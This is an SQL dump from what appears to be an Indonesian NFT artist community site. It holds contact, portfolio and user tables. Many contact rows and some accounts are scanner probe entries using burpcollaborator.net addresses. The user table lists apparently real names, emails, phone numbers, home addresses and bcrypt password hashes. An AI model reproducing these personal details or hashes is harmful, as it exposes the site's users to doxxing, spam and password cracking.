('', 526, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 527, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 528, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 529, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 530, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 531, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 532, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 533, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 534, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 535, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 536, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 537, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 538, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 539, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 540, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 541, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309');
INSERT INTO `contact` (`status`, `id`, `nama`, `email`, `subject`, `message`) VALUES
('', 542, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 543, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 544, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 545, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 546, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 547, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 548, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 549, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 550, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 551, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 552, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 553, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 554, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 555, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 556, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 557, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 558, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 559, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 560, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 561, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 562, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 563, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 564, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 565, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 566, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 567, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 568, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 569, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 570, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 571, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 572, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 573, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 574, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 575, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 576, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 577, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 578, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 579, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 580, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 581, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 582, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 583, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 584, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 585, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 586, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 587, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 588, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 589, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 590, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 591, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 592, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 593, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 594, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 595, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 596, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 597, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 598, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 599, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 600, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 601, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 602, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 603, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 604, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 605, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 606, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 607, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 608, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 609, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 610, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 611, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 612, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 613, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 614, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 615, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 616, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 617, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 618, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 619, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 620, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 621, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 622, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 623, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 624, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 625, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 626, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 627, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 628, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 629, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 630, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 631, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 632, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 633, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 634, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 635, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 636, '840636', 'RyFsGciC@burpcollaborator.net', '637007', '112309'),
('', 637, '662642', 'FnKdgATg@burpcollaborator.net', '438764', '853824'),
('', 638, 'kt5z6bp6fnwywn9ff9ma6raisllrc8dp3e', 'mgo8tucp26jhj6wy2s9ttax1f48azr08qx@burpcollaborator.net', 'vokc1qkla2rdr24uaohp165xn0g67n84yt', 'j67bjd28sp909pmhsbzcjtnk5nytpaqrgg'),
('', 639, '485213', 'CjwZlVJr@burpcollaborator.net', '574241', '445896'),
('', 640, '995905', 'uMgshLBP@burpcollaborator.net', '974489', '999373'),
('', 641, '186034', 'HreEgHyI@burpcollaborator.net', '986473', '526023'),
('', 642, '478652', 'fTefcvIo@burpcollaborator.net', '642168', '373765'),
('', 643, 'oisevyet4alllay24wbxvez5h8ae1v2cs1', 'wntk0zju9bqmqb339xgy0f46m9ff6w7dx2@burpcollaborator.net', 's93am954vlcwclpdv728mpqg8j1ps6tnjc', 'qa3en964wldwdlqdw738nprg9j2pt6unkc'),
('', 645, 'trdazs', 'vgbnd20111@gmail.com', '+', ''),
('', 647, 'DEVITA DWITAMA PUTRI BARON', 'devitadwitama31@gmail.com', 'Test Kritik dan Saran', 'Saran saya agar website IDNFT memiliki'),
('', 648, 'DEVITA DWITAMA PUTRI BARON', 'devitadwitama31@gmail.com', 'Test Kritik dan Saran', 'bshabshhabs');

-- --------------------------------------------------------

--
-- Table structure for table `karya`
--

CREATE TABLE `karya` (
  `id` int(11) NOT NULL,
  `username` varchar(256) NOT NULL,
  `gambar` varchar(256) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- --------------------------------------------------------

--
-- Table structure for table `notification`
--

CREATE TABLE `notification` (
  `email` varchar(255) NOT NULL,
  `id` int(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

-- --------------------------------------------------------

--
-- Table structure for table `portfolio`
--

CREATE TABLE `portfolio` (
  `id` int(11) NOT NULL,
  `username` varchar(255) NOT NULL,
  `nama` varchar(256) NOT NULL,
  `judul` varchar(255) NOT NULL,
  `deskripsi` varchar(255) NOT NULL,
  `gambar` varchar(255) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `portfolio`
--

INSERT INTO `portfolio` (`id`, `username`, `nama`, `judul`, `deskripsi`, `gambar`) VALUES
(15, 'bule', 'bule', 'bule', ' bule', 'bule_20211026_630034988.jpg'),
(16, 'bule', 'bule', 'bule baru', ' bule baru', 'bule_20211026_103204846.png'),
(22, 'aji', 'Aji Begawan', 'chandra', ' marlo marco', 'aji_20211030_280166588.jpg'),
(28, 'aji', 'Aji Begawan', 'aulion', ' auilon', 'aji_20211030_803589471.jpg'),
(29, 'aji', 'Aji Begawan', 'aulion marco', ' doa ibu selamanya', 'aji_20211030_602416993.png'),
(39, 'gatot', 'gatot', 'Ini Project', ' Ini Deskripsi', 'gatot_20211115_969099158.jpg');

-- --------------------------------------------------------

--
-- Table structure for table `role`
--

CREATE TABLE `role` (
  `id_role` int(11) NOT NULL,
  `nama` varchar(50) NOT NULL,
  `keterangan` varchar(50) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `role`
--

INSERT INTO `role` (`id_role`, `nama`, `keterangan`) VALUES
(1, 'Administrator', 'Hak Akses Administrator'),
(2, 'Member', 'Hak Akses member');

-- --------------------------------------------------------

--
-- Table structure for table `sosmed`
--

CREATE TABLE `sosmed` (
  `id` varchar(10) NOT NULL,
  `twitter` varchar(256) NOT NULL,
  `instagram` varchar(256) NOT NULL,
  `discord` varchar(256) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `sosmed`
--

INSERT INTO `sosmed` (`id`, `twitter`, `instagram`, `discord`) VALUES
('1', 'https://twitter.com/idnft_', 'https://www.instagram.com/id.nft/', 'https://discord.com/invite/DMMF7bVYrh');

-- --------------------------------------------------------

--
-- Table structure for table `test_product`
--

CREATE TABLE `test_product` (
  `id` int(13) NOT NULL,
  `nama` varchar(100) NOT NULL,
  `harga` int(10) NOT NULL,
  `jumlah` int(10) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `test_product`
--

INSERT INTO `test_product` (`id`, `nama`, `harga`, `jumlah`) VALUES
(1, 'Vaseline', 25000, 1),
(2, 'Nature Republic', 98, 1),
(3, 'Seblak', 10000, 3);

-- --------------------------------------------------------

--
-- Table structure for table `user`
--

CREATE TABLE `user` (
  `username` varchar(50) NOT NULL,
  `password` varchar(255) NOT NULL,
  `nama` varchar(50) NOT NULL,
  `email` varchar(50) NOT NULL,
  `phone` varchar(15) NOT NULL,
  `alamat` varchar(255) NOT NULL,
  `aliran_seni` varchar(50) NOT NULL,
  `idnft` varchar(50) NOT NULL,
  `instagram` varchar(50) NOT NULL,
  `twitter` varchar(50) NOT NULL,
  `facebook` varchar(50) NOT NULL,
  `role` int(2) NOT NULL,
  `dp` varchar(255) NOT NULL,
  `is_active` int(3) NOT NULL,
  `date_created` varchar(13) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;

--
-- Dumping data for table `user`
--

INSERT INTO `user` (`username`, `password`, `nama`, `email`, `phone`, `alamat`, `aliran_seni`, `idnft`, `instagram`, `twitter`, `facebook`, `role`, `dp`, `is_active`, `date_created`) VALUES
('1', '$2y$10$70bJ3oc4SkryMm1u1vveAuuTSR/14WRCLAGrNTktGX2gCoK3KL9NO', '1', 'mama@gmail.com', '', '', '2D', '40637', '', '', '', 0, '', 0, ''),
('123', '$2y$10$DXlxflUKRSjGdyEbsyt3POMqMFKW26phNFAhwM/Jp.5sYfaSS4qum', 'aji', '123@gmail.com', '', '', '2D', '15382', '', '', '', 2, '', 0, ''),
('airah_aya', '$2y$10$8hCL9Du/6LvaQ6q9XqMSHuxwTPqi60p9FvMx1aPp8.ssAUhzdPMru', 'Airah Limmase', 'airahlimmase@gmail.com', '085155089577', '', '2D', '59109', 'airah.art', '', '', 0, '', 0, ''),
('aji', '$2y$10$lgL02.gDgZP2L7/JfIWyPebxXewWMmIs57cf3ogzmyGE6X8O52GSe', 'Indiarto Aji Begawan', '', '081345518334', 'Cimahi', '', '0', 'https://www.instagram.com/id.nft/', 'twitter Aji', '', 0, '1635650110_aji_474843631.jpg', 0, ''),
('ajibegawan', '$2y$10$j.rqKWOmSvBRHjgsOYYmR.HlU9r5MPveVBKNgM.DkQf/uRpa8gPqW', 'Indiarto Aji Begawan', 'indizi130899@gmail.com', '', '', '2D', '61049', '', '', '', 2, '', 0, ''),
('aldonazario', '$2y$10$UddGCDACVr0DYfIsKyqYBu76uIaSSGB59VIiwQATZ/bICyGw78GaS', 'aldo nazario', 'aldonazario98@gmail.com', '', 'Bandung', '3D', '67570', 'aldonazario', 'aldonazario', '', 2, '', 0, ''),
('altarikbagus', '$2y$10$KQ9FDG/34dpYSifcSzVRgOfjpXJgR7YBkfm6YuN.XPPqWQHP3hTtu', 'altarik bagus prabowo', 'altarik3d@gmail.com', '081291019348', 'Jakarta', '3D', '81506', 'https://www.instagram.com/altarikbagus/', 'https://twitter.com/altarikbagus', '', 2, '', 0, ''),
('anggitamariana2507', '$2y$10$hDcbSsKdr6qar3QPB8SIfuXnGf0AiXu5AkmlDTinLg4Ejw1KzGl.O', 'SUMI', 'maalvacii@hotmail.com', '', '', 'Lain - Lain', '66855', '', '', '', 2, '', 0, ''),
('anggitamariana4549', '$2y$10$c2zKr5OK0Yy1jOBmZ1cAFuYBtrEUg9zn9rHx39bFHxd1jBlvHAC3u', 'KARNI', 'luannakgondim@gmail.com', '', '', 'Lain - Lain', '61265', '', '', '', 0, '', 0, ''),
('AOKqXCVB', '$2y$10$sxQpiL9ShKUAkrMpikupeuI5q/jyq1GJz2PH4YY0ugHPnv0PwBYo2', 'QIlRLBXN', 'qYkINaOy@burpcollaborator.net', '', '', '', '32234', '', '', '', 0, '', 0, ''),
('aozstttz', '$2y$10$RR2.zx4Z.9zNV4.y8xVBCe3AS3yf.k4.S9uWpkGAQri6Ao2y4LuWG', 'DDRfsNrL', 'crsCRKjX@burpcollaborator.net', '', '', '', '2623', '', '', '', 2, '', 0, ''),
('Aryankim_', '$2y$10$XAbnOQihEuQHDDS7roiqdeu.iq/ZMLRONuseICvsq2cQNxc3yZONC', 'Meggy kadam aryanto', 'meggy.aryanto@gmail.com', '081564824675', 'Malang', '2D', '82306', '@doovestudio', '@doovestudio', '', 0, '', 0, ''),
('asmodehoes', '$2y$10$mVrR6bzXtdhv5KVEhCol5eJRKjfS0xT8Mnx4g0ReMKjNo0xjihgDO', 'Mutia', 'mutiafebriana17@gmail.com', '', '', '2D', '47615', '', '', '', 2, '', 0, ''),
('Asquez', '$2y$10$ZaDq0vAldAVD4VHakyzkZu.tEEdhFMO852H7LYQPfak2YBBQFnQsG', 'Asquez', 'asquezmusic@gmail.com', '083115106387', '', 'Lain - Lain', '36296', '@asquezbeat', 'BALI', '', 2, '', 0, ''),
('asWnztZa', '$2y$10$/3YrzpTw/raVQjwls4SYQ.3hFxlzwfKhGticcQ.9nCD0w7ocJywO2', 'USVrvVFI', 'rQDQlgBE@burpcollaborator.net', '', '', '', '73654', '', '', '', 2, '', 0, ''),
('ayinamarianti3618', '$2y$10$pPSZYPGVGuya/IXIwr9w0ubaS05hyFgjXxxm6komxjggZ8dgbA05.', 'NURYANI', 'zildagomes07@gmail.com', '', '', 'Lain - Lain', '11509', '', '', '', 2, '', 0, ''),
('ayinamarianti4783', '$2y$10$txU0OLHvb/uc6T.y4ox0L.Kirq17N3GAZKlpAdZheaox6wH.d0SPy', 'EKA RAHAYU SURYANINGRUM', 'ortisleandro.santos@gmail.com', '', '', 'Lain - Lain', '38871', '', '', '', 2, '', 0, ''),
('ayinamarianti6669', '$2y$10$Up9Oud9iYm0yKnu66PkvauidBPyJ0rY/6khb1zgVmk6JJUJ6DDU1y', 'MARTINI', 'donnahair013@gmail.com', '', '', 'Lain - Lain', '54043', '', '', '', 2, '', 0, ''),
('aylinair', '$2y$10$U9RE.igA4d3GLqnwqkQnuuCRsw0Ty5TlD0t7uBmgfow30QeDBliCu', 'Ismi Isnaini Rosalina', 'aylinair25@gmail.com', '', '', '2D', '47316', '', '', '', 2, '', 0, ''),
('Azwar', '$2y$10$V5b22k/5z0qZa6qmk1aKn.J9J9qBtZLk5g.zw/y84kH9ZMmI4rnmi', 'Muhammad Azwar', 'muhammadazwar232@gmail.com', '083111664972', '', 'Lain - Lain', '81603', '', '', '', 2, '', 0, ''),
('badodik', '$2y$10$EkQWvihBnRwo0l50Jq68yOiUPHLughWO4rJLXlJAbEtPYtYiyTkAW', 'Dziky Sabda', 'dzikysabda@gmail.com', '', '', '2D', '440', 'https://www.instagram.com/badodik/', 'https://twitter.com/badodik', '', 2, '', 0, ''),
('bernadwahyu', '$2y$10$s1Z6vZ8bmKGqXwZmuX4/eeErrLiu0uKOQoZZtzrkEmVRIyEbXVCAm', 'Bernad Wahyu', 'wahoiwow@gmail.com', '', '', 'Lain - Lain', '42404', '', '', '', 2, '', 0, ''),
('bhWVqlsJ', '$2y$10$Sh9sB5rcpQGiE2K3M9LU1ORb.UtOtRjAqsfgYl/PBZFCigLOiXGzi', 'dSPilfaC', 'FKOIzbcO@burpcollaborator.net', '', '', '', '83246', '', '', '', 2, '', 0, ''),
('bkDsSLaM', '$2y$10$0f7gy.7KHu4azdkHGrycZughNqNrc4VSCo8p6HIU2h1hSCqzp1Y5K', 'rMEEAooR', 'MqwHtsgY@burpcollaborator.net', '', '', '', '20713', '', '', '', 2, '', 0, ''),
('Bujang bingung', '$2y$10$JxMGbpFVtq/C4qhGngkhHejOJc1wuCRYy1wD1fsiROH8Nkvo/tMe2', 'Jatnika', 'jatnikasu@gmail.com', '+6282318419081', 'Cirebon', '2D', '32774', 'Luka_jatnika', '', '', 2, '', 0, ''),
('bule', '$2y$10$XnmLzemb8J98M49BYZf9E.RkAAvKX.dIPGd8p51wfLuUBgIUuPMSy', 'bule', 'mama@gmail.com', '', '', '2D', '99449', '', '', '', 2, '1635656765_bule_333681282.jpg', 0, ''),
('by Greed', '$2y$10$mvHTS2tdsNHtTmrRvURit.XJDzYoYX2tDTIts5AI830KQLiXfee5e', 'Rifki Muttaqin', 'rifmuttaqin@gmail.com', '', 'Jakarta', 'Lain - Lain', '24289', 'bygreed_', 'bygreed_', '', 2, '', 0, ''),
('chloetamba4398', '$2y$10$JFsz09utZK1POs/QFulqBu1y5bGVfiITwEUo5twDLD5hrzHTIMwLq', 'MUHAMMAD DAFFA ANDHIKA', 'pameflach.coca@gmail.com', '', '', 'Lain - Lain', '33874', '', '', '', 2, '', 0, ''),
('coretanfira', '$2y$10$UcAxV3caFvmxmTqkErLjFuc3Hmucpg7ytdsPZx5Reu312cjk2xTw2', 'Firda Safhira', 'firdasafhira@gmail.com', '', '', '2D', '26268', 'coretanfira', 'coretanfira_', '', 2, '', 0, ''),
('cXgrSNhk', '$2y$10$1kPcuJqciQS2Tes8ubdoe.A2FHLq4U8h4/rjhLQqHcSec2W8.5G5y', 'iouyXPZj', 'lFAHjpqL@burpcollaborator.net', '', '', '2D', '4532', '', '', '', 2, '', 0, ''),
('cxIjWWAu', '$2y$10$tus7G7/QI3ebUVpkcx8/qenU5L5oY1knpnzeLpogjNjleV5p/Y7su', 'pEmTLJQE', 'CisdwakK@burpcollaborator.net', '', '', '', '53553', '', '', '', 2, '', 0, ''),
('cYrpZpnU', '$2y$10$SV65XnqMo79Nvt.7aD64rumM2JWgTLaRnhdQ5KuVrR.bNa1omWPHm', 'KUvbMzkJ', 'hZlIALat@burpcollaborator.net', '', '', '', '26806', '', '', '', 2, '', 0, ''),
('DAAR', '$2y$10$Y7r9/mAsVLZcJPjwB9zTJ.6CQuavjnwNaOOHde53t/1QWaVsjd7gW', 'Dewi Anggi ARs', 'danggi93@gmail.com', '', '', '2D', '50058', '', '', '', 2, '', 0, ''),
('dadang', '$2y$10$/T3npwi8UiMmItb4eQi0D.kTDAqrkIsUrB1Bj7hn6d1eFxVLeYYuO', 'dadang', 'gatot2018@gmail.com', '', '', '2D', '18424', '', '', '', 2, '', 1, '1636967153'),
('dani', '$2y$10$bzkS5.TZkojz.DHhfgL2AO0rrv9T6NbH.3i9U1WlrfUMbZkc.TWGe', 'dani', 'gatot2018@gmail.com', '', '', '2D', '95598', '', '', '', 2, '', 1, '1636968577'),
('DbdnoMNJ', '$2y$10$2lUqBwjRAoVzNkmKVc.FO.LCEIvYoRxXpLDdP58cQpKpH6Gwb0XI2', 'VatUNnpf', 'NEVMobHp@burpcollaborator.net', '', '', '', '62372', '', '', '', 2, '', 0, ''),
('deepfussion', '$2y$10$lF8XGxjsIc9c1NsVqszvZO3kPZTxD/G.xRWgVAVwRsFKBNSqWMmJK', 'Bachtiar Achmad Nugroho', 'deepfussionone@gmail.com', '', '', 'Lain - Lain', '25379', '', '', '', 2, '', 0, ''),
('dessykurniawati1287', '$2y$10$W/swvJ4XYvdgcs2mwDeE1./PO8IhJE3s5cnq52doxS8/GxdRCihA6', 'MIYEM', 'glauciaalmeidamaiafla@gmail.com', '', '', 'Lain - Lain', '1098', '', '', '', 2, '', 0, ''),
('dessykurniawati8954', '$2y$10$RXISMHCaMtd92LGDcp1Kf.jIRL9yD8S3hrfTe58d8jqc19xAVuV3q', 'NARSI', 'maurolemes386@gmail.com', '', '', 'Lain - Lain', '58286', '', '', '', 2, '', 0, ''),
('didin_bwi', '$2y$10$meiP1JtyZOfuYgKQBtcQvu8ltI/AXbL3nNZotJjY1hOXHOneKdzX.', 'Nur Muhammad Aminuddin Wahid', 'aminuddindidien@gmail.com', '081227849677', 'PETAHUNAN RT 01 RW 03 JAJAG, KEC. GAMBIRAN BANYUWANGI', '2D', '37410', 'didin_bwi', '', '', 2, '', 0, ''),
('Diki', '$2y$10$crQ/uPerpdgRM.ZdcpmWyeVfwILG1DhTWs63CVm8rdZr1S1MsVDDu', 'Jam Tengah Malam', 'dikizagio@gmail.com', '089530180937', 'Jl. Saturnus Tengah No.18', 'Motion', '3989', 'https://www.instagram.com/jamtengahmalam/', 'https://twitter.com/jamtengahmalam', '', 2, '', 0, ''),
('dinajamalia3626', '$2y$10$xyT9hEl3C7hlAjzv3xpcvuWL9XDoZIciJxal92aGdTduGNEseF5Ge', 'WARAS ARIFIN', 'mariasalaoreflexodabeleza@hotmail.com', '', '', 'Lain - Lain', '76128', '', '', '', 2, '', 0, ''),
('dinalarasati3243', '$2y$10$VrDxb2o2knJcTgBHrsN1AecXKeCcb36mqgZDjdF3ZUmq7C2MIBybm', 'SUNARTI', 'fs92567@gmail.com', '', '', 'Lain - Lain', '4134', '', '', '', 2, '', 0, ''),
('dinalarasati4570', '$2y$10$GGlVXTMTNJb9khNHnIy4P.t1gR2EP5l6qJUhjd45w7h.CGF4Q3Sf6', 'SARMINI', 'rubiiana.lira@gmail.com', '', '', 'Lain - Lain', '68203', '', '', '', 2, '', 0, ''),
('dinalarasati7591', '$2y$10$HACxpTo5pxEIbUf5A858B.pTcPoduFtJnU5BizbnCehaWKjquEGH2', 'RIANTI KUSUMA DEWI', 'rog.li@hotmail.com', '', '', 'Lain - Lain', '66376', '', '', '', 2, '', 0, ''),
('dinamariandi8128', '$2y$10$NOTRTRZ17eIppiDSKw4L1edmrfx9cABdmMYHalaexCwpg5SgUdhsq', 'ANDUNG DWI SUSANTO', 'denikfreitas@hotmail.com', '', '', 'Lain - Lain', '31910', '', '', '', 2, '', 0, ''),
('Dinandaputra', '$2y$10$IQ6fUfz7K7H98pUmjtjELeHtWiFmeAtQZfYFT1VcY1FMlRo2oPcpi', 'I Gede Putu Dinanda Putra Pratama', 'dinandaputra@gmail.com', '', '', 'Lain - Lain', '43266', '', '', '', 2, '', 0, ''),
('dindadinianti1057', '$2y$10$o0ZFBce5/11eeYNtNDcdWeXomcSwHfSEhbyb8khP30R0PLVYVQKeS', 'HESTI NUR UTAMI', 'Fabriciaegenilson@gmail.com', '', '', 'Lain - Lain', '97830', '', '', '', 2, '', 0, ''),
('dindadinianti7431', '$2y$10$qdyQ8z2t3Z7d7uel2Rw/Ged2wsDZdOkLq/wlIemWfQqReReJggW/m', 'ADHITYA PUTRA RAMADHAN', 'odsdomicilio705@gmail.com', '', '', 'Lain - Lain', '70297', '', '', '', 2, '', 0, ''),
('dindadinianti9833', '$2y$10$whh2Wgf2sjXQrYACbz3wMO682sLJUsIuOFeOrBYNTIl1At8pKcE16', 'KATMI', 'atsadvocacianathalya@hotmail.com', '', '', 'Lain - Lain', '33675', '', '', '', 2, '', 0, ''),
('dindamariana2846', '$2y$10$IX0.fl1MdU/oqw3PgSdPze4ZDAhijZERByYqjTOOuIvJihwoDWiUC', 'CATUR ARIYADI', 'marlene_csilva@hotmail.com', '', '', 'Lain - Lain', '26641', '', '', '', 2, '', 0, ''),
('dMFQSXnv', '$2y$10$JFl6RnYc8EF0Ym8Jt64PCuUazgjcP7ZGn4KGp2utJxriLrtwb/Fwu', 'WiEkHktk', 'AUvMqlPR@burpcollaborator.net', '', '', '', '7123', '', '', '', 2, '', 0, ''),
('Dpb', '$2y$10$0vnXA7lqP/1Usf6cbJj4pOgaqawT5Syyw.EHx6iNJJ8DR0Be9HWTq', 'Devita P B', 'dev@gmail.com', '', '', '3D', '91078', '', '', '', 2, '', 0, ''),
('dpjZmCiU', '$2y$10$yVJC9Y4lrvD3IOUySNlZreWFBZU1og7w4Udk2BdfozLgC2GO5JKPu', 'GgqOwUYb', 'ZSXevibB@burpcollaborator.net', '109520', '845391', '', '4320', '941862', '522663', '', 2, '', 0, ''),
('duniasantika', '$2y$10$IAGr00cAFZQwv3cxPiN56Ohyw4y47sEzYZ4WCzbjJPVeiFtcDaYma', 'Ilzam Raden Pangestu', 'ilzam.radenp@gmail.com', '+6281398238827', 'Jl. Maulana Yusuf No.6, Citangkil, Kec. Citangkil, Kota Cilegon, Banten 42441', 'Fotografi', '66779', 'https://www.instagram.com/zam_raden', 'https://www.twitter.com/rdenn_', '', 2, '', 0, ''),
('dvta2', '$2y$10$n2RUBVTxlGVvENEh6sUcCupvlOAaigOc9d8BgW/Z8id6ODSxgAnZe', 'devita', 'devitadwitama31@gmail.com', '', '', 'Motion', '19111', '', '', '', 2, '', 0, ''),
('dvta22', '$2y$10$9/NzdrqrAFV2frN1/NXJm.CDSn23pcwPSTO7z3pXQE8.CKX3Awdfi', 'DEVITA DWITAMA PUTRI', 'tes@gmail.com', '', '', 'Motion', '83186', '', '', '', 2, '', 0, ''),
('dvtahihi', '$2y$10$4MmAESb.ngFyqn0RsbBHAuwYoCKbSHK4uowAamk..6e8L0sqZSXKW', 'Devita Dwitama', 'devitadwitama31@gmail.com', '', '', '2D', '26649', '', '', '', 2, '', 0, ''),
('eADfSMBH', '$2y$10$gnUVeCL02itVboB8tNRvQe5GJd0uhtuaZ8Np8hlRzZAFtY9apgOne', 'ywcVATzJ', 'PkctphYD@burpcollaborator.net', '', '', '', '58356', '', '', '', 2, '', 0, ''),
